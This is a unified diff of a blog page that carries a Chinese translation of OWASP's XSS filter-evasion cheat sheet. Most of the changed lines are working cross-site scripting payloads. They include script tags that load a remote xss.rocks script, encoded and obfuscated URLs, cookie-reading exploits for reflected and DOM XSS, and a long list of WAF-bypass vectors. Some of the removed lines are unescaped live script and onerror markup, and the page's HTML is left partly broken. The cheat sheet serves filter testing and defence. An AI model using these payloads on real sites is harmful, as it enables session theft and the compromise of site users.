+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT a=`&gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <p>这是一个XSS样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：</p>
-<blockquote>
-<script a=">'>" src="httx://xss.rocks/xss.js"></script>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <p>这个XSS很让人担心，因为如果不过滤所有活动内容几乎不可能防止此攻击：</p>
-<blockquote>
-<script>document.write(“&lt;SCRI”);</script>PT SRC=”httx://xss.rocks/xss.js”&gt;
-
-</blockquote>
-<h3 id="2-84-URL字符绕过"><a href="#2-84-URL字符绕过" class="headerlink" title="2.84.    URL字符绕过"></a>2.84.    URL字符绕过</h3><p>假定”<a href="http://www.google.com/" target="_blank" rel="external">http://www.google.com/</a>“是不被允许的：</p>
-<h3 id="2-84-1-IP代替域名"><a href="#2-84-1-IP代替域名" class="headerlink" title="2.84.1. IP代替域名"></a><strong>2.84.1. IP代替域名</strong></h3><blockquote>
-<a href="<http://66.102.7.147/>">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-84-URL字符绕过"><a href="#2-84-URL字符绕过" class="headerlink" title="2.84.    URL字符绕过"></a>2.84.    URL字符绕过</h3><p>假定”<a href="http://www.google.com/">http://www.google.com/</a>“是不被允许的：</p>
+<h3 id="2-84-1-IP代替域名"><a href="#2-84-1-IP代替域名" class="headerlink" title="2.84.1. IP代替域名"></a><strong>2.84.1. IP代替域名</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;&lt;http://66.102.7.147/&gt;&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <p>### </p>
-<p>### </p>
-<h3 id="2-84-2-URL编码"><a href="#2-84-2-URL编码" class="headerlink" title="2.84.2. URL编码"></a><strong>2.84.2. URL编码</strong></h3><blockquote>
-<a href="[http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D](http://www.google.com/)">XSS</a>
-
-</blockquote>
-<p>### </p>
+<h3 id="2-84-2-URL编码"><a href="#2-84-2-URL编码" class="headerlink" title="2.84.2. URL编码"></a><strong>2.84.2. URL编码</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;[http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D](http://www.google.com/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <p>### </p>
 <h3 id="2-84-3-双字节编码"><a href="#2-84-3-双字节编码" class="headerlink" title="2.84.3. 双字节编码"></a><strong>2.84.3. 双字节编码</strong></h3><p>(注意：还有另一种双字节编码):</p>
-<blockquote>
-<a href="[http://1113982867/](http://66.102.7.147/)">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;[http://1113982867/](http://66.102.7.147/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-4-十六进制编码"><a href="#2-84-4-十六进制编码" class="headerlink" title="2.84.4. 十六进制编码"></a><strong>2.84.4. 十六进制编码</strong></h3><p>每个数字的允许的范围大概是240位字符，就如你在第二位上看到的，并且由于十六进制是在0到F之间，所以开头的0可以省略:</p>
-<blockquote>
-<a href="[http://0x42.0x0000066.0x7.0x93/](http://66.102.7.147/)">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;[http://0x42.0x0000066.0x7.0x93/](http://66.102.7.147/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-5-八进制编码"><a href="#2-84-5-八进制编码" class="headerlink" title="2.84.5. 八进制编码"></a><strong>2.84.5. 八进制编码</strong></h3><p>又一次允许填充，尽管你必须保证每类在4位字符以上-例如A类，B类等等:</p>
-<blockquote>
-<a href="[http://0102.0146.0007.00000223/](http://66.102.7.147/)">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;[http://0102.0146.0007.00000223/](http://66.102.7.147/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-6-混合编码"><a href="#2-84-6-混合编码" class="headerlink" title="2.84.6. 混合编码"></a><strong>2.84.6. 混合编码</strong></h3><p>让我们混合基本编码并在其中插入一些TAB和换行，虽然不知道浏览器为什么允许这样做。TAB和换行只有被引号包含时才有效:</p>
-<blockquote>
-<a href="h
-
-tt    p://6    6.000146.0x7.147/">XSS</a>
-
-</blockquote>
-<h3 id="2-84-7-协议解析绕过"><a href="#2-84-7-协议解析绕过" class="headerlink" title="2.84.7. 协议解析绕过"></a><strong>2.84.7. 协议解析绕过</strong></h3><p>(// 替代<a href="http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题" target="_blank" rel="external">http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题</a>) 而且可以轻松绕过类似”(ht|f)tp(s)?://“的正则过滤(感谢Ozh提供这部分).你也可以将”//“换成”\“。你需要保证斜杠在正确的位置，否则可能被当成相对路径URL:</p>
-<blockquote>
-<a href="//[www.google.com/](http://www.google.com/)">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;h</div><div class="line"></div><div class="line">tt	p://6	6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-84-7-协议解析绕过"><a href="#2-84-7-协议解析绕过" class="headerlink" title="2.84.7. 协议解析绕过"></a><strong>2.84.7. 协议解析绕过</strong></h3><p>(// 替代<a href="http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题">http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题</a>) 而且可以轻松绕过类似”(ht|f)tp(s)?://“的正则过滤(感谢Ozh提供这部分).你也可以将”//“换成”\“。你需要保证斜杠在正确的位置，否则可能被当成相对路径URL:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;//[www.google.com/](http://www.google.com/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-8-Google的”feeling-lucky”功能1"><a href="#2-84-8-Google的”feeling-lucky”功能1" class="headerlink" title="2.84.8. Google的”feeling lucky”功能1"></a><strong>2.84.8. Google的”feeling lucky”功能1</strong></h3><p>Firefox使用Google的”feeling lucky”功能根据用户输入的任何关键词来将用户重定向。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击FireFox用户。这使用了Firefox的”keyword:”协议。你可以像下面一样使用多个关键词”keyword:XSS+RSnake”。这在Firefox2.0后不再有效.</p>
-<blockquote>
-<a href="//google">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-9-Google的”feeling-lucky”功能2"><a href="#2-84-9-Google的”feeling-lucky”功能2" class="headerlink" title="2.84.9. Google的”feeling lucky”功能2"></a><strong>2.84.9. Google的”feeling lucky”功能2</strong></h3><p>这使用了一个仅在FireFox上有效的小技巧，因为它实现了”feelinglucky”功能。不像下面一个例子，这个在Opera上无效因为Opera会认为只是一个老式的HTTP基础认证钓鱼攻击，但它并不是。它只是一个畸形的URL。如果你点击了对话框的确定，它就可以生效。但是在Opera上会是一个错误对话框，所以认为其不被Opera所支持，同样在Firefox2.0后不再有效。</p>
-<blockquote>
-<a href="[http://ha.ckers.org@google](http://ha.ckers.org@google/)">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;[http://ha.ckers.org@google](http://ha.ckers.org@google/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-10-Google的”feeling-lucky”功能3"><a href="#2-84-10-Google的”feeling-lucky”功能3" class="headerlink" title="2.84.10.      Google的”feeling lucky”功能3"></a><strong>2.84.10.      Google的”feeling lucky”功能3</strong></h3><p>这是一个畸形的URL只在FireFox和Opera下有效，因为它们实现了”feeling lucky”功能。像上面的例子一样，它要求你的攻击页面在Google上特定关键词排名第一（在这个示例里关键词是”google”）</p>
-<blockquote>
-<a href="[http://google:ha.ckers.org](http://google:ha.ckers.org/)">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;[http://google:ha.ckers.org](http://google:ha.ckers.org/)&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-84-11-移除别名"><a href="#2-84-11-移除别名" class="headerlink" title="2.84.11.      移除别名"></a><strong>2.84.11.      移除别名</strong></h3><p>当结合上面的URL，移除”www.”会节约4个字节，总共为正确设置的服务器节省9字节:</p>
-<blockquote>
-<a href="<http://google.com/>">XSS</a>
-
-</blockquote>
-<h3 id="2-84-12-绝对DNS名称后额外的点"><a href="#2-84-12-绝对DNS名称后额外的点" class="headerlink" title="2.84.12.      绝对DNS名称后额外的点"></a><strong>2.84.12.      绝对DNS名称后额外的点</strong></h3><blockquote>
-<a href="<http://www.google.com./>">XSS</a>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;&lt;http://google.com/&gt;&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-84-12-绝对DNS名称后额外的点"><a href="#2-84-12-绝对DNS名称后额外的点" class="headerlink" title="2.84.12.      绝对DNS名称后额外的点"></a><strong>2.84.12.      绝对DNS名称后额外的点</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;&lt;http://www.google.com./&gt;&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-84-13-JavaScriptlink-location"><a href="#2-84-13-JavaScriptlink-location" class="headerlink" title="2.84.13.      JavaScriptlink location"></a><strong>2.84.13.      JavaScriptlink location</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;javascript:document.location=&apos;&lt;http://www.google.com/&gt;&apos;&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <p>### </p>
-<p>### </p>
-<h3 id="2-84-13-JavaScriptlink-location"><a href="#2-84-13-JavaScriptlink-location" class="headerlink" title="2.84.13.      JavaScriptlink location"></a><strong>2.84.13.      JavaScriptlink location</strong></h3><blockquote>
-<a href="javascript:document.location='<http://www.google.com/>'" target="_blank" rel="external">XSS</a>
-
-</blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-84-14-内容替换作为攻击向量"><a href="#2-84-14-内容替换作为攻击向量" class="headerlink" title="2.84.14.      内容替换作为攻击向量"></a><strong>2.84.14.      内容替换作为攻击向量</strong></h3><p>假设”<a href="http://www.google.com/" target="_blank" rel="external">http://www.google.com/</a>“会自动替换为空。我实际使用过类似的攻击向量即通过使用转换过滤器本身（示例如下）来帮助构建攻击向量以对抗现实世界的XSS过滤器:</p>
-<blockquote>
-<a href="<http://www.google.com/ogle.com/>">XSS</a>
-
-</blockquote>
+<h3 id="2-84-14-内容替换作为攻击向量"><a href="#2-84-14-内容替换作为攻击向量" class="headerlink" title="2.84.14.      内容替换作为攻击向量"></a><strong>2.84.14.      内容替换作为攻击向量</strong></h3><p>假设”<a href="http://www.google.com/">http://www.google.com/</a>“会自动替换为空。我实际使用过类似的攻击向量即通过使用转换过滤器本身（示例如下）来帮助构建攻击向量以对抗现实世界的XSS过滤器:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;A HREF=&quot;&lt;http://www.google.com/ogle.com/&gt;&quot;&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-85-字符转义表"><a href="#2-85-字符转义表" class="headerlink" title="2.85.    字符转义表"></a>2.85.    字符转义表</h3><p>下面是HTML和JavaScript中字符“&lt;”的所有可能组合。其中大部分不会被渲染出来，但其中许多可以在某些情况下呈现出来。：</p>
 <blockquote>
 <p>&lt;</p>
@@ -1349,13 +961,13 @@ tt    p://6    6.000146.0x7.147/">XSS</a>
 <p>如果攻击者已经让XSS绕过过滤器，WAF无法阻止攻击透过。</p>
 <p>•基于JavaScript的反射型XSS</p>
 <blockquote>
-<p>示例: <script> … setTimeout(\”writetitle()\”,$_GET[xss]) … </script></p>
-<p>利用: /?xss=500); alert(document.cookie);//</p>
+<p>示例: <code>&lt;script&gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &lt;/script&gt;</code></p>
+<p>利用:<code>/?xss=500); alert(document.cookie);//</code></p>
 </blockquote>
 <p>•基于DOM的XSS</p>
 <blockquote>
-<p>示例: <script> … eval($_GET[xss]); … </script></p>
-<p>利用: /?xss=document.cookie</p>
+<p>示例:<code>&lt;script&gt; ... eval($_GET[xss]); ... &lt;/script&gt;</code></p>
+<p>利用: <code>/?xss=document.cookie</code></p>
 </blockquote>
 <h3 id="通过请求重定向构造XSS"><a href="#通过请求重定向构造XSS" class="headerlink" title="通过请求重定向构造XSS"></a><strong>通过请求重定向构造XSS</strong></h3><p>•存在漏洞代码:</p>
 <blockquote>
@@ -1378,29 +990,10 @@ tt    p://6    6.000146.0x7.147/">XSS</a>
 <p>/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</p>
 </blockquote>
 <p><strong>绕过</strong>WAF可用<strong>字符串.</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">&lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&gt;</div><div class="line"></div><div class="line">&lt;Video&gt; &lt;source onerror = &quot;javascript: alert (XSS)&quot;&gt;</div><div class="line"></div><div class="line">&lt;Input value = &quot;XSS&quot; type = text&gt;</div><div class="line"></div><div class="line">&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt;</div><div class="line"></div><div class="line">&lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&gt;</div><div class="line"></div><div class="line">&quot;&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">&quot;&gt;</div><div class="line"></div><div class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(XSS)&quot;&gt;</div><div class="line"></div><div class="line">&lt;object data=&quot;javascript:alert(XSS)&quot;&gt;</div><div class="line"></div><div class="line">&lt;isindex type=image src=1 onerror=alert(XSS)&gt;</div><div class="line"></div><div class="line">&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;iframe/src=&quot;data:text/html,&lt;svg onload=alert(1)&gt;&quot;&gt;</div><div class="line"></div><div class="line">&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;</div><div class="line"></div><div class="line">&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&apos;&lt;https://www.google.com/&gt;&apos;)&gt;&lt;/script</div><div class="line"></div><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;</div><div class="line"></div><div class="line">&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</div><div class="line"></div><div class="line">&lt;form&gt;&lt;a href=&quot;javascript:\u0061lert(1)&quot;&gt;X</div><div class="line"></div><div class="line">&lt;/script&gt;&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt(1)&quot;/%00*/onerror=&apos;eval(src)&apos;&gt;</div><div class="line"></div><div class="line">&lt;style&gt;//*&#123;x:expression(alert(/xss/))&#125;//&lt;style&gt;&lt;/style&gt; </div><div class="line"></div><div class="line">On Mouse Over</div><div class="line"></div><div class="line">&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&apos;prompt(1)&apos;&quot;&gt;</div><div class="line"></div><div class="line">&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</div><div class="line"></div><div class="line">&lt;script x&gt; alert(1) &lt;/script 1=2</div><div class="line"></div><div class="line">&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</div><div class="line"></div><div class="line">&lt;input/onmouseover=&quot;javaSCRIPTconfirm1&quot;</div><div class="line"></div><div class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
 <blockquote>
-<img src="x" onerror="javascript: window.onerror = alert; throw XSS">
-
-<p><video> <source onerror="javascript: alert (XSS)"></video></p>
-<input value="XSS" type="text">
-
-<applet code="javascript:confirm(document.cookie);">
-
-<isindex x="javascript:" onmouseover="alert(XSS)">
-
-<p>“&gt;”&gt;’&gt;<script>alert(String.fromCharCode(88,83,83))</script></p>
-<p>“&gt;<img src="x:x" onerror="alert(XSS)"></p>
-<p>“&gt;<iframe src="javascript:alert(XSS)"></iframe></p>
-<object data="javascript:alert(XSS)">
-
-<isindex type="image" src="1" onerror="alert(XSS)">
-
-<p><img src="x:alert(alt)" onerror="eval(src)" alt="0"></p>
-<p><img src="x:gif" onerror="window['al\u0065rt'](0)"></p>
-<iframe src="data:text/html,<svg onload=alert(1)>"><br><br><meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"><br><br><svg><script xlink:href="data&colon;,window.open('<https://www.google.com/">')></script><br/><br/><iframe src="javascript&colon;alert&lpar;document&period;location&rpar;"><br/><br/><form><a href="javascript:\u0061lert(1)" target="_blank" rel="external">X<br/><br/><img *%00="" src="worksinchrome&colon;prompt(1)" %00*="" onerror="eval(src)"/><br/><br/><style>//*{x:expression(alert(/xss/))}//<style></style><br/><br/>On Mouse Over<br/><br/>&lt;img src=”/“ =_=” title=”onerror=’prompt(1)’”&gt;<br/><br/><a aa="" aaa="" aaaa="" aaaaa="" aaaaaa="" aaaaaaa="" aaaaaaaa="" aaaaaaaaa="" aaaaaaaaaa="" href="j&#97v&#97script:&#97lert(1)">ClickMe<br/><br/><script x=""> alert(1) </script><button formaction="javascript&colon;alert(1)">CLICKME<br/><br/></button><input onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;" <iframe="" src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"/></a></a></form></iframe>
-
-<hr/>
-</svg></iframe></object></applet></blockquote>
+<hr>
+</blockquote>
 <h3 id="3-1-Alert混淆以绕过过滤器"><a href="#3-1-Alert混淆以绕过过滤器" class="headerlink" title="3.1.  Alert混淆以绕过过滤器"></a>3.1.  Alert混淆以绕过过滤器</h3><blockquote>
 <p>(alert)(1)</p>
 <p>a=alert,a(1)</p>
@@ -1417,10 +1010,10 @@ tt    p://6    6.000146.0x7.147/">XSS</a>
 <p>Mishra Dhiraj</p>
 <h3 id="版权与许可"><a href="#版权与许可" class="headerlink" title="版权与许可"></a><strong>版权与许可</strong></h3><blockquote>
 <p>版权所有：OWASP基金会©</p>
-<p>本文档基于 Creative Commons Attribution ShareAlike3.0 license 发布。任何重用或发行，都必须向他人明确该文档的许可条款。 <a href="http://creativecommons.org/licenses/by-sa/3.0/" target="_blank" rel="external">http://creativecommons.org/licenses/by-sa/3.0/</a></p>
+<p>本文档基于 Creative Commons Attribution ShareAlike3.0 license 发布。任何重用或发行，都必须向他人明确该文档的许可条款。 <a href="http://creativecommons.org/licenses/by-sa/3.0/">http://creativecommons.org/licenses/by-sa/3.0/</a></p>
 </blockquote>
 <p><strong>*原文地址：owasp.org，walletong@ansion编译，转自FreeBuf</strong></p>
-
+</script></p>
       
     </div>
     
@@ -1596,7 +1189,7 @@ tt    p://6    6.000146.0x7.147/">XSS</a>
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-介绍"><span class="nav-number">1.</span> <span class="nav-text">1.介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-测试"><span class="nav-number">2.</span> <span class="nav-text">2.测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-XSS定位器"><span class="nav-number">2.1.</span> <span class="nav-text">2.1.  XSS定位器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-XSS定位器（短）"><span class="nav-number">2.2.</span> <span class="nav-text">2.2.  XSS定位器（短）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-无过滤绕过"><span class="nav-number">2.3.</span> <span class="nav-text">2.3.  无过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-利用多语言进行过滤绕过"><span class="nav-number">2.4.</span> <span class="nav-text">2.4.  利用多语言进行过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-通过JavaScript命令实现的图片XSS"><span class="nav-number">2.5.</span> <span class="nav-text">2.5.  通过JavaScript命令实现的图片XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-无分号无引号"><span class="nav-number">2.6.</span> <span class="nav-text">2.6.  无分号无引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-不区分大小写的XSS攻击向量"><span class="nav-number">2.7.</span> <span class="nav-text">2.7.  不区分大小写的XSS攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-HTML实体"><span class="nav-number">2.8.</span> <span class="nav-text">2.8.  HTML实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-重音符混淆"><span class="nav-number">2.9.</span> <span class="nav-text">2.9.  重音符混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-畸形的A标签"><span class="nav-number">2.10.</span> <span class="nav-text">2.10.    畸形的A标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-11-畸形的IMG标签"><span class="nav-number">2.11.</span> <span class="nav-text">2.11.    畸形的IMG标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-12-fromCharCode函数"><span class="nav-number">2.12.</span> <span class="nav-text">2.12.    fromCharCode函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-13-使用默认SRC属性绕过SRC域名过滤器"><span class="nav-number">2.13.</span> <span class="nav-text">2.13.    使用默认SRC属性绕过SRC域名过滤器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-14-使用默认为空的SRC属性"><span class="nav-number">2.14.</span> <span class="nav-text">2.14.    使用默认为空的SRC属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-15-使用不含SRC属性"><span class="nav-number">2.15.</span> <span class="nav-text">2.15.    使用不含SRC属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-16-通过error事件触发alert"><span class="nav-number">2.16.</span> <span class="nav-text">2.16.    通过error事件触发alert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-17-对IMG标签中onerror属性进行编码"><span class="nav-number">2.17.</span> <span class="nav-text">2.17.    对IMG标签中onerror属性进行编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-18-十进制HTML字符实体编码"><span class="nav-number">2.18.</span> <span class="nav-text">2.18.    十进制HTML字符实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-19-不带分号的十进制HTML字符实体编码"><span class="nav-number">2.19.</span> <span class="nav-text">2.19.    不带分号的十进制HTML字符实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-20-不带分号的十六进制HTML字符实体编码"><span class="nav-number">2.20.</span> <span class="nav-text">2.20.    不带分号的十六进制HTML字符实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-21-内嵌TAB"><span class="nav-number">2.21.</span> <span class="nav-text">2.21.    内嵌TAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-22-内嵌编码后TAB"><span class="nav-number">2.22.</span> <span class="nav-text">2.22.    内嵌编码后TAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-23-内嵌换行分隔XSS攻击代码"><span class="nav-number">2.23.</span> <span class="nav-text">2.23.    内嵌换行分隔XSS攻击代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-24-内嵌回车分隔XSS攻击代码"><span class="nav-number">2.24.</span> <span class="nav-text">2.24.    内嵌回车分隔XSS攻击代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-25-使用空字符分隔JavaScript指令"><span class="nav-number">2.25.</span> <span class="nav-text">2.25.    使用空字符分隔JavaScript指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-26-利用IMG标签中JavaScript指令前的空格和元字符"><span class="nav-number">2.26.</span> <span class="nav-text">2.26.    利用IMG标签中JavaScript指令前的空格和元字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-27-利用非字母非数字字符"><span class="nav-number">2.27.</span> <span class="nav-text">2.27.    利用非字母非数字字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-28-额外的尖括号"><span class="nav-number">2.28.</span> <span class="nav-text">2.28.    额外的尖括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-29-未闭合的script标签"><span class="nav-number">2.29.</span> <span class="nav-text">2.29.    未闭合的script标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-34-闭合title标签"><span class="nav-number">2.30.</span> <span class="nav-text">2.34.    闭合title标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-35-INPUT-image"><span class="nav-number">2.31.</span> <span class="nav-text">2.35.    INPUT image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-36-BODY-image"><span class="nav-number">2.32.</span> <span class="nav-text">2.36.    BODY image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-37-IMG-Dynsrc"><span class="nav-number">2.33.</span> <span class="nav-text">2.37.    IMG Dynsrc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-38-IMG-lowsrc"><span class="nav-number">2.34.</span> <span class="nav-text">2.38.    IMG lowsrc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-39-List-style-image"><span class="nav-number">2.35.</span> <span class="nav-text">2.39.    List-style-image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-40-图片中引用VBscript"><span class="nav-number">2.36.</span> <span class="nav-text">2.40.    图片中引用VBscript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-41-Livescript-仅限旧版本Netscape"><span class="nav-number">2.37.</span> <span class="nav-text">2.41.    Livescript (仅限旧版本Netscape)</span></a></li><li 